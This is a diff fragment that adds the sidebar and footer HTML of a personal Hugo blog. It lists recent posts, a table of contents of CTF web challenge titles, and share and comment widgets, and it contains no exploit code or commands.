+</nav>
+  </div>
+</div>
+
+
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            Posts
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  Recent Posts
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SHCTF-web2026-WP" src="http://localhost:1313/images/shctf3rd.jpg" loading="lazy"
+     width="1771"
+     height="1018"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/shctf-web2026-wp/">
+        SHCTF-web2026-WP
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          February 22, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="Arch&#43;Hyprland" src="http://localhost:1313/images/arch.png" loading="lazy"
+     width="833"
+     height="353"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/arch&#43;hyprland&#43;linux%E5%B0%8F%E6%8A%80%E5%B7%A7/">
+        Arch&#43;Hyprland
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          February 19, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="XXE漏洞利用" src="http://localhost:1313/images/xxe.png" loading="lazy"
+     width="700"
+     height="502"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+        XXE漏洞利用
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          February 17, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="http://localhost:1313/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/ctf-web-guide/">
+        [持续更新] CTF-Web Guide
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="http://localhost:1313/images/SQL.png" loading="lazy"
+     width="1546"
+     height="699"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+        SQLi-labs靶场搭建
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        Contents
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-info---"><strong>Challenge Info</strong> <strong>-</strong> <strong>[阶段1] 05_em_v_CFK</strong></a></li>
+    <li><a href="#challenge-info----1"><strong>Challenge Info</strong> <strong>-</strong> <strong>[阶段1] Eazy_Pyrunner</strong></a></li>
+    <li><a href="#challenge-info----2"><strong>Challenge Info</strong> <strong>-</strong> <strong>[阶段1] Ezphp</strong></a>
+      <ul>
+        <li><a href="#原理详解">原理详解</a></li>
+      </ul>
+    </li>
+    <li><a href="#challenge-info----3"><strong>Challenge Info</strong> <strong>-</strong> <strong>[阶段1] calc?js?fuck!</strong></a></li>
+    <li><a href="#challenge-info----4"><strong>Challenge Info</strong> <strong>-</strong> <strong>[阶段1] ez-ping</strong></a></li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      Actions
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="X Share Button"
+      target="_blank" href="https://x.com/intent/tweet?title=SHCTF-web2026-WP&url=http%3a%2f%2flocalhost%3a1313%2fposts%2fshctf-web2026-wp%2f">
+        <i class="fab fa-2x fa-fw fa-x-twitter mb-2"></i> X
+      </a>
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
+        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fshctf-web2026-wp%2f">
+        <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
+      </a>
+    </div>
+    <hr class="mb-4"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
+      </a>
+  </div>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">xiaochai_123的小窝</p>
+    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2026 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
+    <div class="footer-line visitor" style="margin: 0.5em 0;">
+      <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
+        👤 总访客数 <span id="busuanzi_value_site_uv">...</span>
+      </span>
+      <span id="busuanzi_container_site_pv" class="footer-divider" title="总访问量" style="display: inline; margin-left: 1em;">
+        👁️ 总访问量 <span id="busuanzi_value_site_pv">...</span>
+      </span>
+    </div>
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+    <a class="nav-link social-link p-0 me-1 mb-2" href="mailto:mailto:l2556843965@163.com" title="Email">
+      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
+    </a>
+      <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="https://github.com/xiaochai-123" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="http://localhost:1313/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+<script src="/js/copy-code.js"></script>
+<link rel="stylesheet" href="/css/copy-code.css">
+</footer>
+<script data-precache src="/assets/main/bundle.min.0cb56b3304aadd564b77fa39a0faba86b5cf15e006f0c12f64ba27b354b58e3c.js" integrity="sha256-DLVrMwSq3VZLd/o5oPq6hrXPFeAG8MEvZLons1S1jjw=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.cbea61263c4ff4af25077451650e39434ea61f115c240d221e2dc739ad82b60b.js" integrity="sha256-y&#43;phJjxP9K8lB3RRZQ45Q06mHxFcJA0iHi3HOa2Ctgs=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.560dde3e6a332bcfb3c948907022a5a35751d968de94ab4ef36371ab392ed913.js" integrity="sha256-Vg3ePmozK8&#43;zyUiQcCKlo1dR2WjelKtO82Nxqzku2RM=" crossorigin="anonymous" defer></script>
+<script src="https://giscus.app/client.js"
+    data-repo="xiaochai-123/xiaochai-123.github.io"
+    data-repo-id="R_kgDOQcBRNA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOQcBRNM4Cy98G"
+    data-mapping="pathname"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    defer>
+</script>
+
+
+  </body>
+</html>
